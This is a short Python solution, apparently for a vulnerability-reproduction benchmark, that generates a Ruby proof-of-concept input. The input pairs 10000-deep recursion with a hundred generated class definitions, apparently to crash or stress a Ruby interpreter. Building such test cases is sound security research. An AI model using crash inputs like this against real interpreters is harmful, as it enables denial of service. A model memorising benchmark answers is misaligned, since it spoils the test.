class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_lines = [
            "def rec(n)",
            "  if n <= 0",
            "    return 42",
            "  end",
            "  rec(n - 1) + 1",
            "end",
            "rec(10000)"
        ]
        # Add more to potentially force specific paths
        poc_lines.extend([f"class C{i}; def C{i}.m; end; end" for i in range(100)])
        poc_str = "\n".join(poc_lines) + "\n"
        # Pad to approximate length if needed, but keep short for score
        return poc_str.encode("utf-8")
